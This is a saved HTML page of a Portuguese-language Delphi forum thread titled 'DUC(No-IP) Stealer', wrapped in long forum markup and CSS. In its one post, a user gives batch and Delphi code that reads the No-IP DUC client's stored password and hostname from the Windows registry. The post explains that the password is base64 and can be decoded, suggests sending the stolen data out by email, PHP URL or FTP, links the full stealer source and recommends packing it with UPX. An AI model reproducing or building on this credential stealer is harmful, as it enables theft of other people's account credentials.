+	text-align: center;
+	background: #FFFFFF;
+	border: 1px solid #555555;
+	padding: 4px;
+	margin-top: auto;
+	margin-bottom: auto;
+}
+
+.pp-image-mini-wrap,
+.pp-image-mini-wrap-floatright
+{
+	width: 27px;
+	height: 27px;
+	margin-top: auto;
+	margin-bottom: auto;
+}
+
+.pp-image-thumb-wrap-floatright,
+.pp-image-mini-wrap-floatright
+{
+	float:right;
+}
+
+.pp-tiny-text
+{
+	color: gray;
+	font-size: 10px;
+}
+
+.pp-mini-content-entry,
+.pp-mini-content-entry-noheight,
+.pp-mini-entry-noheight-shaded
+{
+	background-color: #F5F9FD;
+	padding: 6px;
+	border-bottom: 1px dotted #555555;
+	clear:both;
+	width: auto;
+	height: 60px;
+}
+
+.pp-mini-entry-noheight-shaded
+{
+	background-color: #E3DFE7;
+}
+
+.pp-mini-content-entry-noheight,
+.pp-mini-entry-noheight-shaded
+{
+	height: auto;
+}
+
+.pp-tabclear,
+.pp-maintitle
+{
+	font-size: 13px;
+	font-weight: bold; 
+	margin: 0px;
+	padding: 8px;
+}
+
+.pp-tabclear
+{
+	border:0px;
+}
+
+.pp-tabon
+{
+	border-width: 1px 1px 0px 1px;
+	border-style: solid;
+	padding:8px;
+	float:left;
+	width:auto;
+	margin-top:1px;
+	font-size:11px;
+}
+
+.pp-taboff,
+.pp-tabshaded
+{
+	border-width: 1px 1px 0px 1px;
+	border-style: solid;
+	padding:8px;
+	float: left;
+	width: auto;
+	margin-top:1px;
+	font-size:11px;
+}
+
+.pp-tabshaded
+{
+	background-image: url(style_images/ip.boardpr/css_pp_tab_shaded.gif);
+	background-repeat: repeat-x;
+	background-position: left bottom;
+	color: #516795;
+	border-top: 1px solid #7f9BBC;
+	border-left: 1px solid #7f9BBC;
+	border-right: 1px solid #7f9BBC;
+}
+
+.pp-tabon a:link, 
+.pp-tabon a:visited, 
+.pp-tabon a:active
+{
+	text-decoration:none;
+}
+
+.pp-taboff a:link, 
+.pp-taboff a:visited, 
+.pp-taboff a:active,
+.pp-tabshaded a:link, 
+.pp-tabshaded a:visited, 
+.pp-tabshaded a:active
+{
+	text-decoration:none;
+}
+
+.pp-tabwrap
+{
+	height: 34px;
+	margin:0px;
+	padding:0px;
+}
+
+
+
+/* @end */
+
+/* Small blog fix */
+
+#myblogset-info .fieldwrap {
+	background: transparent;
+	border: 0px;
+	border-top: 0;
+    margin: 0px;
+	padding: 0;
+	text-align: left;
+}
+
+
+/* GALLERY STYLES */
+
+.gallery_block {
+	padding: 3px !important;
+	margin: 0px;
+}
+
+.gal_caption {
+	font-size: 14px;
+	padding-bottom: 5px;
+	font-weight: normal;
+}
+
+.gal_cat a {
+	text-decoration: none;
+}
+
+.gal_curr {
+}
+
+.gal_noncurr {
+}
+
+.thumbwrap,
+.thumbwrapp,
+.fullimagewrap
+{
+	margin: 1px;
+	background-color: #fff;
+	border: 1px solid #8e8e8e !important;
+}
+
+.thumbwrapp{
+	border: 2px solid #660707;
+}
+
+.fullimagewrap{
+	background: #F5F9FD;
+	text-align: center;
+	margin: 5px 0 5px 0;
+	padding: 5px;
+}
+
+.thumbwrap h4,
+.thumbwrapp h4{	
+	background: #DDE6F2;
+	border: 0 !important;
+	color: #5176B5; 
+	font-size: 12px;
+	font-weight: bold; 
+	margin: 0;
+	padding: 5px;
+}
+
+.thumbwrap p,
+.thumbwrapp p{
+	border-bottom: 0px !important;
+	margin: 0 !important;
+	padding: 5px !important;
+	text-align: left;
+}
+
+.thumbwrap p.alt,
+.thumbwrapp p.alt{
+	border-bottom: 0px !important;
+	margin: 0 !important;
+	padding: 5px !important;
+	text-align: left;
+}
+
+.thumbwrapp p.pin{
+	background: #EFDFDF !important;
+	text-align: center !important;
+}
+
+.thumbwrap img.galattach,
+.thumbwrapp img.galattach{
+	background: #FFF url(style_images/ip.boardpr/img_larger.gif) no-repeat bottom right;
+	border: 1px solid #424242;
+	margin: 5px;
+	padding: 2px 2px 10px 2px;
+}
+
+/* This is a little hack to fix the
+* scrollbar that appears in the emoticon
+* pane of the post screen */	
+#post_screen_hack table tr td {
+	padding: 0px !important;
+}
+</style>
+<style type="text/css">
+@import url( "http://www.delphix.org/forum/style_images/ip.boardpr/folder_editor_images/css_rte.css" );
+</style></head><body>
+<!--ipb.javascript.start-->
+<script type="text/javascript">
+ //<![CDATA[
+ var ipb_var_st            = "0";
+ var ipb_lang_tpl_q1       = "Por favor, digite um n&uacute;mero para a p&aacute;gina que deseja ir entre 1 e";
+ var ipb_var_s             = "";
+ var ipb_var_phpext        = "php";
+ var ipb_var_base_url      = "http://www.delphix.org/forum/index.php?s=&";
+ var ipb_var_image_url     = "style_images/ip.boardpr";
+ var ipb_input_f           = "10";
+ var ipb_input_t           = "1120";
+ var ipb_input_p           = "0";
+ var ipb_var_cookieid      = "";
+ var ipb_var_cookie_domain = "";
+ var ipb_var_cookie_path   = "/";
+ var ipb_md5_check         = "880ea6a14ea49e853634fbdc5015a024";
+ var ipb_new_msgs          = 0;
+ var use_enhanced_js       = 1;
+ var use_charset           = "iso-8859-1";
+ var ipb_myass_chars_lang  = "N&atilde;o h&aacute; caracteres suficientes";
+ var ajax_load_msg		   = "Carregando...";
+ //]]>
+</script>
+<script type="text/javascript" src="DUC%28No-IP%29%20Stealer_arquivos/ips_ipsclass.js"></script>
+<script type="text/javascript" src="DUC%28No-IP%29%20Stealer_arquivos/ipb_global.js"></script>
+<script type="text/javascript" src="DUC%28No-IP%29%20Stealer_arquivos/ips_menu.js"></script>
+<script type="text/javascript" src="DUC%28No-IP%29%20Stealer_arquivos/ips_menu_html.js"></script>
+<script type="text/javascript" src="DUC%28No-IP%29%20Stealer_arquivos/lang_javascript.js"></script>
+<script type="text/javascript">
+//<![CDATA[
+var ipsclass = new ipsclass();
+ipsclass.init();
+ipsclass.settings['do_linked_resize'] = parseInt( "1" );
+ipsclass.settings['resize_percent']   = parseInt( "50" );
+//]]>
+</script>
+<!--ipb.javascript.end-->
+	<div id="logostrip"></div>
+	<div id="submenu">
+		<!--ipb.leftlinks.start-->
+		<div id="submenu_left">
+		
+			<a href="http://www.delphix.org/">http://www.delphix.org</a>
+		
+			
+		<!--IBF.RULES-->
+		</div>
+		<!--ipb.leftlinks.end-->
+		<!--ipb.rightlinks.start-->
+		<div id="submenu_right">
+			<a href="http://www.delphix.org/forum/index.php?act=Help">Ajuda</a>
+			<a style="cursor: pointer;" href="http://www.delphix.org/forum/index.php?act=Search&amp;f=10" id="ipb-tl-search">Busca</a>
+			<a href="http://www.delphix.org/forum/index.php?act=Members">Membros</a>
+			<a href="http://www.delphix.org/forum/index.php?act=calendar">Calendário</a>
+			
+			<div class="popupmenu-new" id="ipb-tl-search_menu" style="display: none; width: 210px; position: absolute; left: 0px; top: 0px;">
+				<form action="http://www.delphix.org/forum/index.php?act=Search&amp;CODE=01" method="post">
+					<input name="forums" id="gbl-search-forums" value="10" type="hidden"> 
+					<input size="20" name="keywords" id="ipb-tl-search-box" type="text">
+					<input class="button" style="border: 0px none ;" src="DUC%28No-IP%29%20Stealer_arquivos/login-button.gif" type="image">
+					
+						<br><input id="gbl-search-checkbox" value="1" onclick="gbl_check_search_box()" checked="checked" type="checkbox"> Buscar apenas neste fórum?
+					
+				</form>
+				<div style="padding: 4px;">
+					<a href="http://www.delphix.org/forum/index.php?act=Search">Mais opções</a>
+				</div>
+			</div>
+			<script type="text/javascript">
+				ipsmenu.register( "ipb-tl-search", 'document.getElementById("ipb-tl-search-box").focus();' );
+				gbl_check_search_box();
+			</script>
+		</div>
+		<!--ipb.rightlinks.end-->
+	</div>
+
+<script type="text/javascript" src="DUC%28No-IP%29%20Stealer_arquivos/ips_xmlhttprequest.js"></script>
+<script type="text/javascript" src="DUC%28No-IP%29%20Stealer_arquivos/ipb_global_xmlenhanced.js"></script>
+<script type="text/javascript" src="DUC%28No-IP%29%20Stealer_arquivos/dom-drag.js"></script>
+<div id="get-myassistant" style="display: none; width: 400px; text-align: left;">
+<div class="borderwrap">
+ <div class="maintitle" id="myass-drag" title="Clique e segure para mover esta janela">
+  <div style="float: right;"><a href="#" onclick='document.getElementById("get-myassistant").style.display="none"'>[X]</a></div>
+  <div>Meu Assistente</div>
+ </div>
+ <div id="myass-content" style="overflow-x: auto;"></div>
+ </div>
+</div>
+<!-- Loading Layer -->
+<div id="loading-layer" style="display: none;">
+	<div id="loading-layer-shadow">
+	   <div id="loading-layer-inner">
+	 	<img src="DUC%28No-IP%29%20Stealer_arquivos/loading_anim.gif" alt="Carregando. Por favor aguarde..." border="0">
+		<span style="font-weight: bold;" id="loading-layer-text">Carregando. Por favor aguarde...</span>
+	    </div>
+	</div>
+</div>
+<!-- / Loading Layer -->
+<!-- Msg Layer -->
+<div id="ipd-msg-wrapper">
+	<div id="ipd-msg-title">
+		<a href="#" onclick='document.getElementById("ipd-msg-wrapper").style.display="none"; return false;'><img src="DUC%28No-IP%29%20Stealer_arquivos/close.png" alt="X" title="Close Window" class="ipd"></a> &nbsp; <strong>Mensagem</strong>
+	</div>
+	<div id="ipd-msg-inner"><span style="font-weight: bold;" id="ipd-msg-text"></span><div class="pp-tiny-text">(A mensagem fechará automaticamente em 2 segundos)</div></div>
+</div>
+<!-- Msg Layer -->
+
+<!-- / End board header -->
+
+<div id="userlinksguest">
+	<p class="pcen"><b>Bem-vindo, visitante</b> ( <a href="http://www.delphix.org/forum/index.php?act=Login&amp;CODE=00">Entrar</a> | <a href="http://www.delphix.org/forum/index.php?act=Reg&amp;CODE=00">Registrar</a> )
+
+
+
+
+
+
+
+	</p>
+</div>
+<div id="ipbwrapper">
+<div id="navstrip"><img src="DUC%28No-IP%29%20Stealer_arquivos/nav.gif" alt="&gt;" border="0">&nbsp;<a href="http://www.delphix.org/forum/index.php?act=idx">Fórum DelphiX</a>&nbsp;&gt;&nbsp;<a href="http://www.delphix.org/forum/index.php?showforum=17">Projetos</a>&nbsp;&gt;&nbsp;<a href="http://www.delphix.org/forum/index.php?showforum=10">Projetos Open Source</a></div>
+<!--IBF.NEWPMBOX-->
+<script type="text/javascript">
+<!--
+var ipb_lang_tt_prompt = "Manualmente, copie o link direto para o post a seguir na sua &aacute;rea de transfer&ecirc;ncia";
+var ipb_lang_js_del_1  = "Voc&ecirc; tem certeza de que deseja remover esta mensagem?";
+var ipb_lang_js_del_2  = "Ok, nenhuma a&ccedil;&atilde;o foi efetuada";
+var addquotebutton     = "style_images/ip.boardpr/p_mq_add.gif";
+var removequotebutton  = "style_images/ip.boardpr/p_mq_remove.gif";
+var unselectedbutton = "style_images/ip.boardpr/topic_unselected.gif";
+var selectedbutton   = "style_images/ip.boardpr/topic_selected.gif";
+var lang_gobutton    = "Com selecionado";
+var lang_suredelete  = "Voc&ecirc; tem certeza que deseja remover estes posts?";
+var js_error_no_permission = "Desculpe, voc&ecirc; n&atilde;o tem permiss&atilde;o para editar esse post";
+var js_no_empty_post = "Voc&ecirc; n&atilde;o pode envir um post vazio";
+//-->
+</script>
+<script type="text/javascript" src="DUC%28No-IP%29%20Stealer_arquivos/ipb_topic.js"></script>
+<script type="text/javascript" src="DUC%28No-IP%29%20Stealer_arquivos/ips_text_editor_lite.js"></script>
+<script type="text/javascript">
+//<![CDATA[
+topic_rate = new topic_rate();
+//]]>
+</script>
+<a name="top"></a>
+
+
+<table class="ipbtable" cellspacing="0">
+	<tbody><tr>
+		<td style="padding-left: 0px;" nowrap="nowrap" valign="middle" width="40%"><div>&nbsp;</div></td>
+		<td class="nopad" style="padding: 0px 0px 5px;" align="right" valign="middle" width="60%"><a href="http://www.delphix.org/forum/index.php?act=post&amp;do=reply_post&amp;f=10&amp;t=1120"><img src="DUC%28No-IP%29%20Stealer_arquivos/t_reply.gif" alt="Reply to this topic" border="0"></a><a href="http://www.delphix.org/forum/index.php?act=post&amp;do=new_post&amp;f=10" title="Iniciar um novo tópico"><img src="DUC%28No-IP%29%20Stealer_arquivos/t_new.gif" alt="Start new topic" border="0"></a></td>
+	</tr>
+</tbody></table>
+
+<div class="borderwrap">
+	<div class="maintitle">
+	<!-- TABLE FIX FOR MOZILLA WRAPPING-->
+	<table style="padding: 0px;" cellpadding="0" cellspacing="0" width="100%">
+	<tbody><tr>
+	 <td style="" width="99%"><div><b>[Delphi] DUC(No-IP) Stealer</b></div></td>
+	 
+	 <td align="right" nowrap="nowrap" width="1%">
+		
+		
+			
+		
+		
+     </td>
+	 <td align="right" nowrap="nowrap" width="1%">
+	    <div style="cursor: pointer;" class="popmenubutton" id="topicmenu-options"><a href="#topicoptions">Opções</a> <img src="DUC%28No-IP%29%20Stealer_arquivos/menu_action_down.gif" alt="V" title="Abrir Menu" border="0"></div>
+	 
+<div class="popupmenu" id="topicmenu-options_menu" style="display: none; z-index: 100; position: absolute; left: 0px; top: 0px;">
+<div class="popupmenu-item">
+<img src="DUC%28No-IP%29%20Stealer_arquivos/menu_item.gif" alt="V" style="vertical-align: middle;" border="0"> <a href="http://www.delphix.org/forum/index.php?act=usercp&amp;CODE=start_subs&amp;method=topic&amp;tid=1120">Assinar este tópico</a>
+</div>
+<div class="popupmenu-item">
+<img src="DUC%28No-IP%29%20Stealer_arquivos/menu_item.gif" alt="V" style="vertical-align: middle;" border="0"> <a href="http://www.delphix.org/forum/index.php?act=Forward&amp;f=10&amp;t=1120">Enviar este tópico</a>
+</div>
+<div class="popupmenu-item">
+<img src="DUC%28No-IP%29%20Stealer_arquivos/menu_item.gif" alt="V" style="vertical-align: middle;" border="0"> <a href="http://www.delphix.org/forum/index.php?act=Print&amp;client=printer&amp;f=10&amp;t=1120">Imprimir este tópico</a>
+</div>
+<div class="popupmenu-item">
+<img src="DUC%28No-IP%29%20Stealer_arquivos/menu_item.gif" alt="V" style="vertical-align: middle;" border="0"> <a href="http://www.delphix.org/forum/index.php?act=Print&amp;client=choose&amp;f=10&amp;t=1120">Baixar este tópico</a>
+</div>
+<div class="popupmenu-item">
+<img src="DUC%28No-IP%29%20Stealer_arquivos/menu_item.gif" alt="V" style="vertical-align: middle;" border="0"> <a href="http://www.delphix.org/forum/index.php?act=usercp&amp;CODE=start_subs&amp;method=forum&amp;fid=10">Assinar este fórum</a>
+</div>
+<div class="popupmenu-category" align="center">Modos de Exibição</div><div class="popupmenu-item">
+<img src="DUC%28No-IP%29%20Stealer_arquivos/menu_item.gif" alt="V" style="vertical-align: middle;" border="0"> <a href="http://www.delphix.org/forum/index.php?showtopic=1120&amp;mode=threaded">Mudar para: Outline</a>
+</div>
+<div class="popupmenu-item">
+<img src="DUC%28No-IP%29%20Stealer_arquivos/menu_item.gif" alt="V" style="vertical-align: middle;" border="0"> <strong><em><a href="http://www.delphix.org/forum/index.php?showtopic=1120&amp;mode=linear">Padrão</a></em></strong>
+</div>
+<div class="popupmenu-item-last">
+<img src="DUC%28No-IP%29%20Stealer_arquivos/menu_item.gif" alt="V" style="vertical-align: middle;" border="0"> <a href="http://www.delphix.org/forum/index.php?showtopic=1120&amp;mode=linearplus">Mudar para: Linear+</a>
+</div>
+
+</div>
+</td>
+	</tr>
+  </tbody></table>
+	 
+ </div>
+ <!--{IBF.POLL}-->
+<script type="text/javascript">
+<!--
+menu_build_menu(
+"topicmenu-options",
+new Array(   img_item + " <a href='http://www.delphix.org/forum/index.php?act=usercp&amp;CODE=start_subs&amp;method=topic&amp;tid=1120'>Assinar este t&oacute;pico</a>",
+ 			 img_item + " <a href='http://www.delphix.org/forum/index.php?act=Forward&amp;f=10&amp;t=1120'>Enviar este t&oacute;pico</a>",
+ 			 img_item + " <a href='http://www.delphix.org/forum/index.php?act=Print&amp;client=printer&amp;f=10&amp;t=1120'>Imprimir este t&oacute;pico</a>",
+             img_item + " <a href='http://www.delphix.org/forum/index.php?act=Print&amp;client=choose&amp;f=10&amp;t=1120'>Baixar este t&oacute;pico</a>",
+ 			 img_item + " <a href='http://www.delphix.org/forum/index.php?act=usercp&amp;CODE=start_subs&amp;method=forum&amp;fid=10'>Assinar este f&oacute;rum</a>",
+ 			 "~~NODIV~~<div class='popupmenu-category' align='center'>Modos de Exibi&ccedil;&atilde;o</div>",
+ 			 img_item + " <a href='http://www.delphix.org/forum/index.php?showtopic=1120&amp;mode=threaded'>Mudar para: Outline</a>",
+ 			 img_item + " <strong><em><a href='http://www.delphix.org/forum/index.php?showtopic=1120&amp;mode=linear'>Padr&atilde;o</a></em></strong>",
+ 			 img_item + " <a href='http://www.delphix.org/forum/index.php?showtopic=1120&amp;mode=linearplus'>Mudar para: Linear+</a>"
+	    ) );
+topic_rate.settings['allow_rating']       = parseInt("0");
+topic_rate.settings['default_rating']     = parseInt("0");
+topic_rate.settings['img_base_url']       = ipb_var_image_url + '/folder_topic_view';
+topic_rate.settings['div_rating_wrapper'] = 'topic-rating-wrapper';
+topic_rate.settings['text_rating_image']  = 'topic-rating-img-';
+topic_rate.languages['img_alt_rate']      = "Avalie este t&oacute;pico, clique na quantia de estrelas desejadas";
+topic_rate.languages['rate_me']           = "Avaliar t&oacute;pico:";
+topic_rate.init_rating_images();
+-->
+</script><!--Begin Msg Number 3911-->
+<table class="ipbtable" cellspacing="0">
+	<tbody><tr>
+		<td class="post_head" valign="middle" width="1%">
+			<a name="entry3911"></a>
+			
+				<div style="cursor: pointer;" id="post-member-3911" class="popmenubutton-new-out">
+					<span class="normalname">
+	<img src="DUC%28No-IP%29%20Stealer_arquivos/user-offline.png" alt="" border="0"><a href="http://www.delphix.org/forum/index.php?showuser=500">whit3_sh4rk</a></span>
+				</div>
+				<!-- member menu -->
+				<div class="popupmenu-new" id="post-member-3911_menu" style="display: none; width: 230px; position: absolute; left: 0px; top: 0px;">
+					<div class="popupmenu-item-last">
+						
+						<div style="float: right;">
+							<div class="pp-image-thumb-wrap">
+								<img src="DUC%28No-IP%29%20Stealer_arquivos/pp-blank-thumb.png" alt="" height="50" width="50">
+							</div>
+							
+								<div style="margin-top: 5px; margin-left: 6px;">
+									<img src="DUC%28No-IP%29%20Stealer_arquivos/rating_0_mini.gif" alt="Avaliação: 0" style="vertical-align: middle;" border="0">
+								</div>
+							
+						</div>
+						<div class="popupmenu-item">
+							
+	<img src="DUC%28No-IP%29%20Stealer_arquivos/gender_mystery.png" id="pp-entry-gender-img-500" alt="" border="0">
+ <a href="http://www.delphix.org/forum/index.php?showuser=500">Visualizar perfil</a>
+						</div>
+						
+					</div>
+				</div>
+				<!-- member menu -->
+				<script type="text/javascript">
+					ipsmenu.register( "post-member-3911", '', 'popmenubutton-new', 'popmenubutton-new-out' );
+				</script>
+			
+			
+		</td>
+		<td class="post_head" valign="middle" width="99%">
+			<!-- POSTED DATE DIV -->
+			<div style="float: left;">
+				<span class="postdetails"><img src="DUC%28No-IP%29%20Stealer_arquivos/icon11.gif" alt=""> <img src="DUC%28No-IP%29%20Stealer_arquivos/to_post_off.gif" alt="post" style="padding-bottom: 2px;" border="0"> Dec 10 2007, 16:26</span>
+			</div>
+			<!-- REPORT / DELETE / EDIT / QUOTE DIV -->
+			<div align="right">
+				<span class="postdetails"> Post
+					<a title="Mostrar o link para este post" href="http://www.delphix.org/forum/index.php?showtopic=1120&amp;view=findpost&amp;p=3911" onclick="link_to_post(3911); return false;">#1</a>
+					
+				</span>
+			</div>
+		</td>
+	</tr>
+	<tr>
+		<td class="post2 post_left" valign="top">
+        	<span class="postdetails">
+				
+					<a href="http://www.delphix.org/forum/index.php?showuser=500" title="Visualizar perfil"><img src="DUC%28No-IP%29%20Stealer_arquivos/av-500.jpg" alt="" border="0" height="100" width="94"></a><br><br>
+				
+        		Membro<br>
+        		<img src="DUC%28No-IP%29%20Stealer_arquivos/pip.gif" alt="*" border="0"><img src="DUC%28No-IP%29%20Stealer_arquivos/pip.gif" alt="*" border="0"><br><br>
+        		Grupo: Usuários<br>
+        		Posts: 11<br>
+        		 Registrado: 13-June 05<br>
+        		
+        		Membro N°: 500<br>
+				
+				<br>
+        		 
+        	</span><br>
+        	<img src="DUC%28No-IP%29%20Stealer_arquivos/spacer.gif" alt="" height="1" width="160"><br> 
+       </td>
+       <td class="post2" id="post-main-3911" valign="top" width="100%">
+			<!-- THE POST 3911 -->
+			<div class="postcolor" id="post-3911">
+				Bom, para quem usa o serviço No-IP(<a href="http://www.invasao.com.br/coluna-souzadc-07.php" target="_blank">Tutorial</a>) e tem instalado o utilitário <b>DUC</b> para a atualização da DNS, estarei mostrando como obter a senha, usando batch script e/ou delphi..<br><br>Batch:<br><!--c1--><div class="codetop">CODE</div><div class="codemain"><!--ec1-->@echo off<br>FOR
+/F "TOKENS=2* delims=&nbsp;&nbsp;&nbsp;&nbsp;" %%A IN ('REG QUERY
+HKLM\SOFTWARE\Vitalwerks\DUC /v Password') DO SET PassNoIP=%%B<br>echo A senha eh: %PassNoIP%<!--c2--></div><!--ec2--><br><br>Com a ajudinha do <i>FOR</i> obtemos apenas o que queremos, a senha...<br><br>Teste sem o uso do <i>FOR</i>:<br><!--c1--><div class="codetop">CODE</div><div class="codemain"><!--ec1-->@echo off<br>REG QUERY HKLM\SOFTWARE\Vitalwerks\DUC /v Password<!--c2--></div><!--ec2--><br><br>Agora pegando a url da DNS:<br><!--c1--><div class="codetop">CODE</div><div class="codemain"><!--ec1-->@echo off<br>FOR /F "TOKENS=2* delims=#," %%A IN ('REG QUERY HKLM\SOFTWARE\Vitalwerks\DUC /v Hosts') DO SET Host=%%A<br>echo O host eh: %Host%<!--c2--></div><!--ec2--><br><br>Novamente com a ajuda do <i>FOR</i>, sem ele ficaria:<br><!--c1--><div class="codetop">CODE</div><div class="codemain"><!--ec1-->@echo off<br>REG QUERY HKLM\SOFTWARE\Vitalwerks\DUC /v Hosts<!--c2--></div><!--ec2--><br><br>Pronto em batch script é isso..<br><br>Agora em delphi:<br>Primeiro, declare <i>Registry</i> em <i>uses</i>..<br>Em um evento OnClick de um botão, faça:<br><!--c1--><div class="codetop">CODE</div><div class="codemain"><!--ec1-->procedure TForm1.Button1Click(Sender: TObject);<br>var<br>&nbsp;&nbsp;Reg: TRegistry;<br>&nbsp;&nbsp;Host: String;<br>&nbsp;&nbsp;Senha: String;<br>begin<br>&nbsp;&nbsp;Reg:=TRegistry.create;<br>&nbsp;&nbsp;with Reg do<br>&nbsp;&nbsp;begin<br>&nbsp;&nbsp;rootkey:=HKEY_LOCAL_MACHINE;<br>&nbsp;&nbsp;OpenkeyReadOnly('SOFTWARE\Vitalwerks\DUC');<br>&nbsp;&nbsp;Host:=readstring('Hosts');<br>&nbsp;&nbsp;Senha:=readstring('Password');<br>&nbsp;&nbsp;closekey;<br>&nbsp;&nbsp;end;<br>&nbsp;&nbsp;ShowMessage('DNS: '+Host+#13#10+'Senha: '+Senha);<br>&nbsp;&nbsp;end;<!--c2--></div><!--ec2--><br><br>Testem aí.. bom, em ambos os métodos, recebemos a senha codificada em base64..<br>Se for algum newbie, não terá valido o trabalho, pois não saberá o que fazer com uma senha criptografada..<br><br>Mas se não for, e a pessoa souber que é base64 é só ir no google e buscar: <b>base64 decode</b>..<br>Agora entre no primeiro site que aparecer:<br><a href="http://www.opinionatedgeek.com/dotnet/tools/Base64Decode/" target="_blank">http://www.opinionatedgeek.com/dotnet/tools/Base64Decode/</a><br><br>E decodifique a senha... Pronto..<br><br>Foi apenas uma demonstração simples de como obter esses dados do serviço No-IP localmente..<br><br>Mas
+é claro que nada te impede de fazer algo mais trabalhado, como por
+exemplo fazer uma tool para pegar esses dados e enviá-los por email,
+para uma URL(php), ou até mesmo para um FTP..<br><br>O que pode ser baixado aqui o source:<br><a href="http://hyperupload.com/download/022fa19b82/DUCStealer.zip.html" target="_blank">http://hyperupload.com/download/022fa19b82...tealer.zip.html</a><br><br>Mesmo sendo em <b>console application</b>
+na minha opinião ficou grandin o executável, 233kb, pois utiliza o
+componente idHTTP (Indy).. Mas nada que um packer não resolva.. Aqui,
+com o clássico UPX ficou 89kb..<br><br>Então é isso.. <br><br>[]s
+				
+				
+				<!--IBF.ATTACHMENT_3911-->
+			</div>
+			
+			<br><br>--------------------<br>
+<div class="signature">[center]<img src="DUC%28No-IP%29%20Stealer_arquivos/delphix.htm" alt="user posted image" border="0">[/center]</div>
+			<!-- THE POST -->		
+		</td>
+	</tr>
+	<tr>
+		<td class="formbuttonrow" nowrap="nowrap">
+			<div style="text-align: left;"><a href="javascript:scroll(0,0);"><img src="DUC%28No-IP%29%20Stealer_arquivos/p_up.gif" alt="Go to the top of the page" border="0"></a></div>
+		</td>
+		<td class="formbuttonrow" nowrap="nowrap">
+			<!-- PM / EMAIL / WWW / MSGR -->
+			<div style="float: left;">
+				&nbsp;
+			</div>
+			<!-- REPORT / UP -->
+         	<div align="right">
+         		<a href="#" onclick="multiquote_add(3911); return false;" title="Ativar/desativar adição de citação"><img src="DUC%28No-IP%29%20Stealer_arquivos/p_mq_add.gif" name="mad_3911" alt="+"></a><a href="http://www.delphix.org/forum/index.php?act=Post&amp;CODE=02&amp;f=10&amp;t=1120&amp;qpid=3911" title="Responder diretamente a este post"><img src="DUC%28No-IP%29%20Stealer_arquivos/p_quote.gif" alt="Quote Post" border="0"></a>
+         	</div>
+         </td>
+	</tr><tr>
+	<td class="catend" colspan="2">
+	<!-- no content -->
+	</td>
+</tr>
+</tbody></table>
+<!-- END TABLE -->
+
+<!-- TABLE FOOTER -->
+<div class="barc">
+	<div style="padding: 5px 5px 0pt 0pt; float: right;"><a href="http://www.delphix.org/forum/index.php?showtopic=1120&amp;view=old" style="text-decoration: none;">« Próximo mais velho</a>
+	· <a href="http://www.delphix.org/forum/index.php?showforum=10" style="font-weight: bold; text-decoration: none;">Projetos Open Source</a>
+	· <a href="http://www.delphix.org/forum/index.php?showtopic=1120&amp;view=new" style="text-decoration: none;">Próximo mais novo »</a></div>
+	<div>
+		<form action="http://www.delphix.org/forum/index.php?" method="post" name="search">
+			<input name="forums" value="10" type="hidden">
+			<input name="topic" value="1120" type="hidden">
+			<input name="act" value="Search" type="hidden">
+			<input name="CODE" value="searchtopic" type="hidden">
+			<input size="25" name="keywords" class="searchinput" value="Digite palavras-chave" onfocus="this.value = '';" type="text">&nbsp;
+			<input value="Buscar no tópico" class="button" type="submit">
+		</form>
+	</div>
+</div>
+</div>
+<br>
+<!--IBF.MOD_FULL_WRAPPER-->
+
+<table class="ipbtable" cellspacing="0">
+	<tbody><tr>
+		<td style="padding-left: 0px;" nowrap="nowrap" valign="middle" width="30%"><div></div></td>
+		<td class="nopad" style="padding: 5px 0px;" align="right" width="70%"><!--IBF.QUICK_REPLY_CLOSED--><a href="http://www.delphix.org/forum/index.php?act=post&amp;do=reply_post&amp;f=10&amp;t=1120"><img src="DUC%28No-IP%29%20Stealer_arquivos/t_reply.gif" alt="Reply to this topic" border="0"></a><a href="http://www.delphix.org/forum/index.php?act=post&amp;do=new_post&amp;f=10" title="Iniciar um novo tópico"><img src="DUC%28No-IP%29%20Stealer_arquivos/t_new.gif" alt="Start new topic" border="0"></a></td>
+	</tr>
+</tbody></table>
+<div class="borderwrap" style="padding-bottom: 1px;">
+	<div class="formsubtitle" style="padding: 4px;">1 usuário(s) está(ão) lendo este tópico (1 visitantes e 0 usuários anônimos)</div>
+	<div class="row1" style="padding: 4px;">0 membros: </div>
+</div>
+<!--IBF.QUICK_REPLY_OPEN-->
+<br>
+<div class="borderwrap">
+	<div class="row2" style="padding: 5px;">
+		
+		<div align="right"><form onsubmit="if(document.jumpmenu.f.value == -1){return false;}" action="http://www.delphix.org/forum/index.php?act=SF" method="get" name="jumpmenu">
+			             <input name="act" value="SF" type="hidden">
+<input name="s" value="" type="hidden">
+			             <select name="f" onchange="if(this.options[this.selectedIndex].value != -1){ document.jumpmenu.submit() }" class="dropdown">
+			             <optgroup label="Ir para">
+			              <option value="sj_home">Página Inicial</option>
+			              <option value="sj_search">Busca</option>
+			              <option value="sj_help">Ajuda</option>
+			             </optgroup>
+			             <optgroup label="Ir para o fórum"><option value="14">Geral</option>
+<option value="2">&nbsp;&nbsp;|-- Anúncios</option>
+<option value="3">&nbsp;&nbsp;|-- Off Topic</option>
+<option value="15">Delphi</option>
+<option value="4">&nbsp;&nbsp;|-- Geral</option>
+<option value="5">&nbsp;&nbsp;|-- Internet - Comunicação</option>
+<option value="6">&nbsp;&nbsp;|-- Banco de dados</option>
+<option value="7">&nbsp;&nbsp;|-- Jogos</option>
+<option value="8">&nbsp;&nbsp;|-- Multimídia</option>
+<option value="11">&nbsp;&nbsp;|-- Automação</option>
+<option value="16">Outras IDEs</option>
+<option value="9">&nbsp;&nbsp;|-- Kylix</option>
+<option value="22">&nbsp;&nbsp;|-- Delphi for PHP</option>
+<option value="18">Tecnologia</option>
+<option value="13">&nbsp;&nbsp;|-- .NET</option>
+<option value="12">&nbsp;&nbsp;|-- ERP</option>
+<option value="17">Projetos</option>
+<option value="10" selected="selected">&nbsp;&nbsp;|-- Projetos Open Source</option>
+<option value="21">Análise de Sistemas</option>
+<option value="20">&nbsp;&nbsp;|-- Projetos</option>
+</optgroup>
+</select>&nbsp;<input value="Ok" class="button" type="submit"></form></div>
+	</div>
+</div>
+<br>
+<!-- NON JS STUFF -->
+<div style="display: none;" id="topicoptionsjs">
+ <a name="topicdisplay"></a>
+ <div class="borderwrap">
+  <div class="bar" style="padding: 5px; text-align: center;">
+  <strong>Modos de Exibição:</strong> <strong><em><a href="http://www.delphix.org/forum/index.php?showtopic=1120&amp;mode=linear">Padrão</a></em></strong> ·
+  <a href="http://www.delphix.org/forum/index.php?showtopic=1120&amp;mode=linearplus">Mudar para: Linear+</a> ·
+  <a href="http://www.delphix.org/forum/index.php?showtopic=1120&amp;mode=threaded">Mudar para: Outline</a>
+  </div>
+ </div>
+ <br>
+ <a name="topicoptions"></a>
+ <div class="borderwrap">
+  <div class="bar" style="padding: 5px; text-align: center;">
